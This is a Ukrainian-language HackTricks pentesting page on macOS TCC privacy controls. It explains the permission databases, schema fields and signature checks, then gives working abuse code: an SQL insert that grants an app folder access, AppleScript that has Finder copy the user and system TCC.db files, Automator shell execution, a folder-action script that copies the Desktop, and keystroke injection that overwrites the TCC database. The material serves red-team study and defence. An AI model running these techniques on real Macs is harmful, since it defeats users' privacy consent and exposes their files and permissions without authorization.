# macOS TCC

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## **Основна інформація**

**TCC (Transparency, Consent, and Control)** - це протокол безпеки, який спрямований на регулювання дозволів програм. Його основна роль полягає в захисті чутливих функцій, таких як **сервіси місцезнаходження, контакти, фотографії, мікрофон, камера, доступ до повного диску**. Завдяки обов'язковому явному згоду користувача перед наданням додатку доступу до цих елементів, TCC підвищує конфіденційність та контроль користувача над їхніми даними.

Користувачі стикаються з TCC, коли програми запитують доступ до захищених функцій. Це видно через спливаюче вікно, яке дозволяє користувачам **затвердити або відхилити доступ**. Крім того, TCC враховує прямі дії користувача, такі як **перетягування та відпускання файлів у додаток**, для надання доступу до конкретних файлів, забезпечуючи, що додатки мають доступ лише до того, що явно дозволено.

![Приклад спливаючого вікна TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** обробляється **демоном**, розташованим у `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` та налаштованим у `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (реєструючи службу mach `com.apple.tccd.system`).

Є **tccd у режимі користувача**, який працює для кожного ввійшовшого користувача, визначений у `/System/Library/LaunchAgents/com.apple.tccd.plist`, реєструючи служби mach `com.apple.tccd` та `com.apple.usernotifications.delegate.com.apple.tccd`.

Тут ви можете побачити tccd, який працює в системі та в режимі користувача:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Дозволи **успадковуються від батьківського** додатка, а **дозволи відстежуються** на основі **ідентифікатора пакета** та **ідентифікатора розробника**.

### Бази даних TCC

Дозволи/відмови потім зберігаються в деяких базах даних TCC:

* Системна база даних в **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Ця база даних захищена SIP, тому лише обхід SIP може записувати в неї.
* База даних користувача TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** для налаштувань на рівні користувача.
* Ця база даних захищена, тому лише процеси з високими привілеями TCC, такі як Повний доступ до диска, можуть записувати в неї (але вона не захищена SIP).

{% hint style="warning" %}
Попередні бази даних також **захищені TCC для доступу на читання**. Тому ви **не зможете прочитати** свою звичайну базу даних TCC користувача, якщо це не з привілеями TCC.

Однак пам'ятайте, що процес з цими високими привілеями (наприклад, **FDA** або **`kTCCServiceEndpointSecurityClient`**) зможе записувати базу даних користувачів TCC.
{% endhint %}

* Є **третя** база даних TCC в **`/var/db/locationd/clients.plist`**, щоб вказати клієнтів, яким дозволено **отримувати доступ до служб місцезнаходження**.
* Файл, захищений SIP **`/Users/carlospolop/Downloads/REG.db`** (також захищений від доступу на читання за допомогою TCC), містить **розташування всіх дійсних баз даних TCC**.
* Файл, захищений SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (також захищений від доступу на читання за допомогою TCC), містить більше наданих дозволів TCC.
* Файл, захищений SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (але доступний для читання кожному) є списком дозволених додатків, які потребують винятку TCC.

{% hint style="success" %}
База даних TCC в **iOS** знаходиться в **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**Центр сповіщень UI** може вносити **зміни в системну базу даних TCC**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Однак користувачі можуть **видаляти або запитувати правила** за допомогою утиліти командного рядка **`tccutil`**.
{% endhint %}

#### Запит баз даних

{% tabs %}
{% tab title="база даних користувача" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="системна БД" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Перевіряючи обидві бази даних, ви можете перевірити дозволи, які додаток дозволив, заборонив або не має (він попросить про це).
{% endhint %}

* **`service`** - це рядок представлення дозволу TCC
* **`client`** - це **ідентифікатор пакета** або **шлях до виконуваного файлу** з дозволами
* **`client_type`** вказує, чи це Ідентифікатор пакета(0) чи абсолютний шлях(1)

<details>

<summary>Як виконати, якщо це абсолютний шлях</summary>

Просто виконайте **`launctl load you_bin.plist`**, з файлом plist, подібним до:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** може мати різні значення: відхилено(0), невідомо(1), дозволено(2) або обмежено(3).
* **`auth_reason`** може приймати наступні значення: Помилка(1), Згода користувача(2), Встановлено користувачем(3), Встановлено системою(4), Політика служби(5), Політика MDM(6), Політика заміщення(7), Відсутній рядок використання(8), Тайм-аут запиту(9), Невідомий передполіт(10), Наданий доступ(11), Політика типу додатку(12)
* Поле **csreq** вказує на те, як перевірити виконання бінарного файлу та надати дозволи TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Для отримання додаткової інформації про **інші поля** таблиці [**перевірте цей допис у блозі**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Ви також можете перевірити **вже надані дозволи** для додатків у `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

{% hint style="success" %}
Користувачі _можуть_ **видаляти або запитувати правила** за допомогою **`tccutil`**.
{% endhint %}

#### Скидання дозволів TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Перевірки підпису TCC

База даних TCC зберігає **ідентифікатор пакета** додатка, а також **інформацію** про **підпис**, щоб **переконатися**, що додаток, який просить дозвіл, є правильним.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Отже, інші програми з використанням того ж самого імені та ідентифікатора пакета не зможуть отримати доступ до наданих дозволів, наданих іншим додаткам.
{% endhint %}

### Повноваження та дозволи TCC

Додатки **не тільки повинні** запитувати та мати **надані дозволи** до деяких ресурсів, вони також повинні **мати відповідні повноваження**.\
Наприклад, **Telegram** має повноваження `com.apple.security.device.camera` для запиту **доступу до камери**. **Додаток**, який **не має** цього **повноваження, не зможе** отримати доступ до камери (і користувача навіть не буде запитано про дозволи).

Однак, для додатків, щоб **отримати доступ** до **певних папок користувача**, таких як `~/Desktop`, `~/Downloads` та `~/Documents`, їм **не потрібно мати** жодних конкретних **повноважень.** Система буде прозоро керувати доступом та **запитувати користувача** за необхідності.

Додатки Apple **не будуть генерувати вікна запитів**. Вони містять **передбачені права** у своєму **списку повноважень**, що означає, що вони **ніколи не згенерують спливаюче вікно**, **і** вони не будуть відображатися в жодній з **баз даних TCC.** Наприклад:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Це дозволить Календарю не запитувати користувача про доступ до нагадувань, календаря та адресної книги.

{% hint style="success" %}
Крім офіційної документації про дозволи, також можна знайти неофіційну **цікаву інформацію про дозволи в** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Деякі дозволи TCC: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Не існує загального списку, що визначає їх всіх, але ви можете перевірити цей [**список відомих**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Чутливі незахищені місця

* $HOME (саме по собі)
* $HOME/.ssh, $HOME/.aws, тощо
* /tmp

### Намір користувача / com.apple.macl

Як вже зазначалося, можливо **надати доступ до файлу програмі за допомогою перетягування його на неї**. Цей доступ не буде вказаний в жодній базі даних TCC, але як **розширений** **атрибут файлу**. Цей атрибут буде **зберігати UUID** дозволеної програми:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Цікаво, що атрибут **`com.apple.macl`** керується **Sandbox**, а не tccd.

Також зверніть увагу, що якщо ви перемістите файл, який дозволяє UUID додатка на вашому комп'ютері, на інший комп'ютер, то, оскільки цьому самому додатку будуть присвоєні різні UID, він не надасть доступ до цього додатка.
{% endhint %}

Розширений атрибут `com.apple.macl` **не може бути очищений** як інші розширені атрибути через те, що він **захищений SIP**. Однак, як [**пояснено в цьому пості**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), його можна вимкнути, **заархівувавши** файл, **видаливши** його і **розархівувавши**.

## Підвищення привілеїв та обхід захисту TCC

### Вставка в TCC

Якщо ви в якийсь момент зможете отримати доступ на запис до бази даних TCC, ви можете скористатися чимось на зразок наступного, щоб додати запис (видаліть коментарі):

<details>

<summary>Приклад вставки в TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Пейлоади

Якщо вам вдалося потрапити в додаток з деякими дозволами TCC, перевірте наступну сторінку з TCC пейлоадами для їх зловживання:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Автоматизація (Finder) до FDA\*

Назва TCC дозволу для автоматизації - **`kTCCServiceAppleEvents`**\
Цей конкретний дозвіл TCC також вказує на **додаток, яким можна керувати** в базі даних TCC (так що дозволи не дозволяють просто керувати всім).

**Finder** - це додаток, який **завжди має FDA** (навіть якщо він не відображається в інтерфейсі), тому якщо у вас є привілеї **Автоматизації** над ним, ви можете зловживати його привілеями, щоб **змусити його виконувати деякі дії**.\
У цьому випадку вашому додатку знадобиться дозвіл **`kTCCServiceAppleEvents`** над **`com.apple.Finder`**.

{% tabs %}
{% tab title="Вкрасти базу даних користувачів TCC" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Викрасти системну базу даних TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Ви можете скористатися цим, щоб **створити власну базу даних користувача TCC**.

{% hint style="warning" %}
З цим дозволом ви зможете **попросити Finder отримати доступ до обмежених папок TCC** та передати вам файли, але наскільки я знаю, ви **не зможете змусити Finder виконати довільний код** для повного зловживання його доступом до FDA.

Отже, ви не зможете зловживати повними можливостями FDA.
{% endhint %}

Ось запит TCC для отримання привілеїв автоматизації над Finder:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Зверніть увагу, що оскільки додаток **Automator** має дозвіл TCC **`kTCCServiceAppleEvents`**, він може **керувати будь-яким додатком**, наприклад, Finder. Таким чином, маючи дозвіл на керування Automator, ви також зможете керувати **Finder** за допомогою коду, подібного наведеному нижче:
{% endhint %}

<details>

<summary>Отримати оболонку всередині Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Те ж саме відбувається з **додатком Script Editor,** він може керувати Finder, але за допомогою AppleScript ви не можете змусити його виконати скрипт.

### Автоматизація (SE) для деяких TCC

**System Events може створювати дії папки, і дії папки можуть отримувати доступ до деяких папок TCC** (Робочий стіл, Документи та Завантаження), тому скрипт, подібний до наступного, можна використовувати для зловживання цією поведінкою:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Автоматизація (SE) + Доступність (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** до FDA\*

Автоматизація на **`System Events`** + Доступність (**`kTCCServicePostEvent`**) дозволяє відправляти **натискання клавіш процесам**. Таким чином ви можете зловживати Finder, щоб змінити базу даних користувачів TCC або надати FDA довільній програмі (хоча для цього може знадобитися пароль).

Приклад перезапису Finder бази даних користувачів TCC:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` до FDA\*

Перевірте цю сторінку для деяких [**пейлоадів для зловживання дозволами на доступність**](macos-tcc-payloads.md#accessibility) для підвищення привілеїв до FDA\* або запуску keylogger, наприклад.

### **Клієнт захисту кінцевої точки до FDA**

Якщо у вас є **`kTCCServiceEndpointSecurityClient`**, у вас є FDA. Кінець.

### Системний файл політики SysAdmin до FDA

**`kTCCServiceSystemPolicySysAdminFiles`** дозволяє **змінювати** атрибут **`NFSHomeDirectory`** користувача, що змінює його домашню теку і, отже, дозволяє **обійти TCC**.

### База даних користувача TCC до FDA

Отримавши **права на запис** у базі даних **користувача TCC**, ви не можете надати собі права **`FDA`**, тільки той, хто проживає в системній базі даних, може надати це.

Але ви можете дати собі **права на автоматизацію для Finder**, і скористатися попередньою технікою для підвищення до FDA\*.

### **FDA до дозволів TCC**

**Повний доступ до диска** у TCC називається **`kTCCServiceSystemPolicyAllFiles`**

Я не думаю, що це справжнє підвищення привілеїв, але на всякий випадок, якщо ви керуєте програмою з FDA, ви можете **змінити базу даних користувачів TCC і надати собі будь-який доступ**. Це може бути корисним як техніка постійності у випадку, якщо ви втратите свої права FDA.

### **Обхід SIP для обходу TCC**

База даних системи **TCC** захищена **SIP**, тому тільки процеси з **вказаними привілеями можуть змінювати** її. Тому, якщо зловмисник знаходить **обхід SIP** над **файлом** (може змінювати файл, обмежений SIP), він зможе:

* **Видалити захист** бази даних TCC та надати собі всі дозволи TCC. Він може скористатися будь-якими з цих файлів, наприклад:
* Системна база даних TCC
* REG.db
* MDMOverrides.plist

Однак є ще один варіант зловживання цим **обходом SIP для обходу TCC**, файл `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` є списком дозволених додатків, які потребують винятку TCC. Тому, якщо зловмисник може **видалити захист SIP** з цього файлу та додати свій **власний додаток**, додаток зможе обійти TCC.\
Наприклад, щоб додати термінал:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Обхід TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Посилання

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
